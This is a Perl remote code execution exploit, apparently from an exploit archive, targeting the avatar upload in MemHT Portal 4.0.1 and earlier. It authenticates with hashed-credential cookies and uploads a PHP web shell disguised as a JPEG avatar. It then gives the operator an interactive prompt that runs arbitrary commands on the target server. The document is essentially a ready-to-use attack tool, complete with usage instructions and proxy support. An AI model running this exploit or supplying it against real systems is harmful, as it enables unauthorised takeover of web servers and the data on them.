MemHT Portal <= 4.0.1 (avatar) Remote Code Execution Exploit
============================================================


#!/usr/bin/perl 
# MemHT Portal <= 4.0.1 (avatar) Remote Code Execution Exploit

use Getopt::Std;
use Digest::MD5(&#039;md5_hex&#039;);
use LWP::UserAgent;


getopts(&#039;p:&#039;,\my %opts);

my ($host,$file,$id,$username,$password) = @ARGV;

my $http = new LWP::UserAgent;
my $u_agent = "Lynx (textmode)";
my $cookies = "login_user=$id#".md5_hex($username)."#".md5_hex($password);


Main::RunExploit();


# Main Package

package Main;


sub Usage {

return print <<EOF;
+--------------------------------------------------------------+
| MemHT Portal <= 4.0.1 (avatar) Remote Code Execution Exploit |
+--------------------------------------------------------------+
by yeat - staker[at]hotmail[dot]it

Usage: perl xpl.pl host/path file id user pass [OPTIONS]
host: target host and memht path
file: file to upload
user: valid username
pass: valid password
id: user id

Options:

-p [specify a proxy] [server]:[port]

Example: 
perl xpl.pl localhost/memht yeat.php 38 MrJack obscure 
perl xpl.pl localhost/memht yeat.php 38 MrJack obscure -p 213.151.89.109:80

EOF

}


sub RunExploit 
{    
    if (defined $opts{p}) {
        HTTP::Proxy($opts{p});
    }
    
    if (@ARGV < 5 || @ARGV > 7) {
        Main::Usage();
    }
    else { 
        HTTP::UserAgent($u_agent);
        MemHT::Login();     
        MemHT::Exploit($file);
    }    
}




# MemHT Exploit Package

package MemHT;

sub Exploit 
{
    my $resp;
    my $file = shift(@_);
    my $path = "/index.php?page=users&op=editProfile";

    my $data = {
        chg_email => &#039;yeat@doesntexist.net&#039;,
        avatar    => [
                      undef,
                      $file,
                      Content_Type => &#039;image/jpeg&#039;,
                      Content      => &#039;<?php error_reporting(E_ALL); eval($_REQUEST[\&#039;cmd\&#039;]); ?>&#039;,
                      # Content => &#039;Here you can write everything :) this is an example!&#039;,
                     ],
        chg       => &#039;true&#039;,
        Submit    => &#039;Modify&#039;,
    };  
    
    my $send = $http->post(&#039;http://&#039;.$host.$path,
                           $data,
                           Content_Type => &#039;multipart/form-data&#039;,
                          );
    
    if ($send->as_string =~ m{logout}i) {
        print "File Uploaded! / $host/images/avatar/uploaded/$file\n\n";
        
        while (1) {
           print "\n[yeat-PHPshell]:~# ";
           chomp(my $content = <STDIN>);
           $resp = HTTP::GET("$host/images/avatar/uploaded/$file?cmd=$content");
           print $resp->content;
        }                         
    }
    else {
        print "Exploit Failed!\n";
        exit;
    }     
}   
           

sub Login
{
    HTTP::Cookies($cookies);
    my $response = HTTP::GET($host.&#039;/index.php?page=pvtmsg&op=newMessage&#039;);
    
    if ($response->content =~ /access denied/i) {
        print "Login Failed!\n";
        exit;
    }
}           
           
                                 

# HTTP Package

package HTTP;


sub Cookies 
{
    return $http->default_header(&#039;Cookie&#039; => $_[0]);
}

sub UserAgent 
{
    return $http->agent($_[0]);
}    

sub GET 
{    
    if ($_[0] !~ m{^http://(.+?)$}i) {
        return $http->get(&#039;http://&#039;.$_[0]);
    }    
    else {
        return $http->get($_[0]);
    }    
}
    
sub POST 
{   
    if ($_[0] !~ m{^http://(.+?)$}i) {
        return $http->post(&#039;http://&#039;.$_[0]);
    }    
    else {
        return $http->post($_[0]);
    }    
}
    
sub http_header 
{
    return $http->default_header($_[0]);
}            
    
sub Proxy 
{
    return $http->proxy(&#039;http&#039;, &#039;http://&#039;.$_[0]);   
}   




